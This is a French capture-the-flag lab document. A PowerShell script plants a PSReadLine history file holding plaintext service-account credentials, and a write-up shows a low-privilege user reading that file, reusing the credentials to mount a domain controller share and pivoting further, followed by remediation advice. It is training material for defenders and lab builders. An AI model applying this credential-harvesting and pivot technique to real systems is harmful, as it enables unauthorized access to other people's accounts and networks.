# Flag 4 — Historique PowerShell avec credentials

> **Technique :** Credential Harvesting via PSReadLine History
> **Machine de déploiement :** WS01
> **Machine d'exploitation :** WS01
> **Compte de départ :** `CTF\lowpriv` / `User@1234`
> **Difficulté :** Facile

---

## Déploiement

### Prérequis

> [!warning] Action manuelle AVANT le script
> Se connecter **une fois** sur WS01 avec `CTF\lowpriv` / `User@1234` pour que Windows crée le profil utilisateur complet. Ouvrir PowerShell, taper une commande quelconque, puis se déconnecter. Revenir sur la session Administrator avant de lancer le script.

### Script — Flag4-Historique-PS.ps1

> [!warning] Lancer en PowerShell Admin sur WS01

```powershell
#Requires -RunAsAdministrator

Write-Host "`n[FLAG 4] Historique PowerShell avec credentials" -ForegroundColor Cyan

# Verifier que le profil lowpriv existe
if (-not (Test-Path "C:\Users\lowpriv")) {
    Write-Host "  [!] ERREUR : profil lowpriv inexistant." -ForegroundColor Red
    Write-Host "  [!] Connecte-toi une fois avec CTF\lowpriv, puis relance ce script." -ForegroundColor Red
    exit 1
}

$histDir  = "C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
$histFile = "$histDir\ConsoleHost_history.txt"
New-Item -ItemType Directory -Path $histDir -Force | Out-Null

# Historique realiste avec credentials en clair
@"
whoami
hostname
ipconfig /all
net user /domain
Get-ADUser -Filter * | Select Name, SamAccountName
cd C:\Users\lowpriv\Documents
ls
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Service | Where-Object Status -eq Running
net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
dir Z:\
net use Z: /delete
Get-EventLog -LogName System -Newest 20
"@ | Set-Content -Path $histFile -Encoding UTF8
Write-Host "  [+] Historique injecte : $histFile" -ForegroundColor Green

# Permissions : SYSTEM + Admins (FullControl), lowpriv (Read uniquement)
$acl = Get-Acl $histDir
$acl.SetAccessRuleProtection($true, $false)
$acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
foreach ($sid in @("S-1-5-18", "S-1-5-32-544")) {
    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
        $s, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
}
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "CTF\lowpriv", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
Set-Acl -Path $histDir -AclObject $acl
Write-Host "  [+] Permissions : lecture seule pour lowpriv" -ForegroundColor Green

# Verifications
Write-Host "`n  [*] Verification du fichier :" -ForegroundColor Yellow
Test-Path $histFile
Write-Host "`n  [*] Permissions :" -ForegroundColor Yellow
icacls $histFile

Write-Host "`n[FLAG 4] DONE" -ForegroundColor Green
Write-Host "  SNAPSHOT : WS01 - Flag4 deploye" -ForegroundColor Yellow
```

---

### Vérification du déploiement

> [!warning] Depuis PowerShell Admin sur WS01

```powershell
# Verifier que le fichier existe
Test-Path "C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# Attendu : True

# Verifier le contenu (en admin)
Get-Content "C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# Attendu : ligne contenant "net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99"
```

> [!success] Snapshot WS01
> **`WS01 — Flag4 déployé`**

---

## Write-up

### Contexte

PSReadLine est un module PowerShell qui améliore l'expérience en ligne de commande. Il sauvegarde automatiquement toutes les commandes tapées dans un fichier texte persistant entre les sessions : `ConsoleHost_history.txt`. Ce fichier n'est pas géré par les cmdlets d'historique classiques (`Get-History`) et est souvent oublié par les administrateurs. Il peut contenir des credentials passés directement en argument de commande.

---

### Reconnaissance

#### Étape 1 — Trouver le fichier d'historique

Connecté en `CTF\lowpriv` sur WS01, ouvrir PowerShell :

```powershell
# Chemin standard du fichier d'historique PSReadLine
$histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Test-Path $histPath
```

**Résultat :**

```
True
```

Le fichier existe.

#### Étape 2 — Lire le fichier

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Résultat :**

```powershell
whoami
hostname
ipconfig /all
net user /domain
Get-ADUser -Filter * | Select Name, SamAccountName
cd C:\Users\lowpriv\Documents
ls
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Service | Where-Object Status -eq Running
net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
dir Z:\
net use Z: /delete
Get-EventLog -LogName System -Newest 20
```

On repère immédiatement la ligne :

```
net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
```

Les credentials du compte `svc-backup` sont exposés en clair : `Backup@Secure99`.

---

### Exploitation

#### Étape 3 — Utiliser les credentials pour accéder au share

```powershell
net use B: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
```

**Résultat :**

```
La commande s'est terminée correctement.
```

#### Étape 4 — Lister le contenu du share

```powershell
dir B:\
```

**Résultat :**

```
Répertoire : B:\

Mode    LastWriteTime  Name
----    -------------  ----
-a----               flag3.txt
```

#### Étape 5 — Lire le flag

```powershell
Get-Content B:\flag3.txt
```

**Résultat :**

```
FLAG{ad_acl_delegation_abuse}
```

```powershell
# Nettoyer le lecteur mappé
net use B: /delete
```

---

### Récupération du flag

```powershell
Get-Content B:\flag3.txt
```

**Résultat :**

```
FLAG{ad_acl_delegation_abuse}
```

> [!note]
> Le Flag 4 et le Flag 3 mènent au même share `\\DC01\Backups`. Deux chemins différents pour le même résultat : l'un via les ACL AD, l'autre via les credentials exposés dans l'historique.

---

### Aller plus loin

Avec le compte `svc-backup`, on peut aussi pivoter vers d'autres ressources auxquelles ce compte a accès sur le réseau :

```powershell
# Tester l'acces a d'autres shares
net use \\DC01 /user:CTF\svc-backup Backup@Secure99
net view \\DC01

# Tenter une connexion RDP ou PSRemoting
Enter-PSSession -ComputerName DC01 -Credential (Get-Credential)
# CTF\svc-backup / Backup@Secure99
```

---

### Remédiation

| Problème | Correction |
|---|---|
| Credentials passés en argument CLI | Ne jamais passer de mots de passe en argument — utiliser `Get-Credential` ou des secrets managés |
| Historique PSReadLine non géré | Vider régulièrement l'historique : `Clear-History` + supprimer `ConsoleHost_history.txt` |
| Désactiver la persistance | `Set-PSReadLineOption -HistorySaveStyle SaveNothing` dans le profil PowerShell |
| Pas de rotation des credentials | Mettre en place une rotation régulière des mots de passe de comptes de service |

---

### Résumé de la chaîne d'exploitation

```
lowpriv
  └─→ $env:APPDATA\...\PSReadLine\ConsoleHost_history.txt
        └─→ "net use ... /user:CTF\svc-backup Backup@Secure99"
              └─→ credentials svc-backup en clair
                    └─→ net use \\DC01\Backups /user:svc-backup Backup@Secure99
                          └─→ FLAG{ad_acl_delegation_abuse}
```
